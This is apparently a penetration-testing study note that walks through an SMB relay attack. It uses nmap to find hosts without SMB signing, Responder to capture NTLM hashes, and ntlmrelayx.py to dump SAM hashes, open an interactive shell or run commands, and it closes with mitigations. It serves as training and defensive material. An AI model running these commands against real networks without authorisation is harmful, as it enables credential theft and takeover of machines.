What is SMB Relay?

Instead of cracking hashes gathered with Responder, we can instead relay those hashes to specific machines and potentially gain access

Requirements:

1) SMB signing must be disabled or not enforced on the target 
2) Relayed user credentials must be admin on machine for any real value.

How to SMB relay: 

1) Identify hosts without SMB Signing

```
nmap --script=smb2-security-mode.nse -p445 <IP_address> -Pn
```

We can use -Pn to try probing it if we don't find a host without SMB signing on it

![[Pasted image 20240827114321.png]]

2) Edit  Responder config file:

```
sudo mousepad /etc/responder/Responder.conf
```

![[Pasted image 20240827114539.png]]

We need to turn SMB and HTTP off because we need to make sure that the hashes are not being stored, they're instead getting relayed.

3) Run Responder:

```
sudo responder -I eth0 -dwPv
```

4) Set up your relay:

```
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

-tf stands for target file.

![[Pasted image 20240827114802.png]]

5) An event occurs:

![[Pasted image 20240827115046.png]]

Go to the active Directory and point to the attacker machine.

6) We won!

![[Pasted image 20240827115115.png]]

It dumps out the SAM hashes here. We can then crack those hashes to gain access to the system.

7) Other Wins:

```
sudo ntlmrelayx.py -f targets.txt -smb2support -i
```

We can also put an -i at the end so that we can get an interactive shell instead of dumping the SAM hashes.

![[Pasted image 20240827115337.png]]

```
sudo ntlmrelayx.py -f targets.txt -smb2support -c "whoami"
```

We can also run commands using -c which is also really cool.

![[Pasted image 20240827115508.png]]

Mitigation Strategies:

1) Enable SMB Signing on all devices:
	1) Pro: Completely stops the attack.
	2) Con: Can cause performance issues with file copies.
2) Disable NTLM authentication on network:
	1) Pro: Completely stops the attack.
	2) Con: If kerberos stops working, Windows defaults back to NTLM.
3) Account tiering:
	1) Pro: Limits domain admins to specific tasks (e.g: only log onto servers with need for DA).
	2) Con: Enforcing the policy may be difficult.
4) Local admin restriction:
	1) Pro: Can prevent a lot of lateral movement.
	2) Con: Potential increase in the amount of service desk tickets.